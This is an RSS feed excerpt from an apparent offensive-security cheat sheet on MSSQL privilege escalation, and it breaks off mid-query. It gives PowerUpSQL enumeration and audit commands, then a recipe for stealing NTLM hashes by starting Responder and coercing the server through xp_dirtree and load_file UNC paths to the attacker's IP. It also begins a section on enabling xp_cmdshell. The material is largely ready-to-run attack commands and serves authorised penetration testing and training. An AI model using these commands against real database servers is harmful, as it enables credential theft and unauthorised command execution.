channel.title: Domain Users on TLDRBins
channel.description: Recent content in Domain Users on TLDRBins

item.title: MSSQL Privilege Escalation
item.description: Enum 1. Import Module . .\PowerUpSQL.ps1 2. Audit Invoke-SQLAudit -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Verbose 3. Execute Query Get-SQLQuery -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Query "<QUERY>" -Verbose Ref: PowerUpSQL.ps1 Abuse #1: Steal NTLM hash 1. Start a Listener sudo responder -I tun0 2. Coercing Authentication Method 1 Method 2 Method 3 xp_dirtree '\\<LOCAL_IP>\any\thing'; use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing'; load_file('\\<LOCAL_IP>\any\thing'); Abuse #2: Run xp_cmdshell 1. Check Any Policy Blocking xp_cmdshell [Optional] select name from sys.
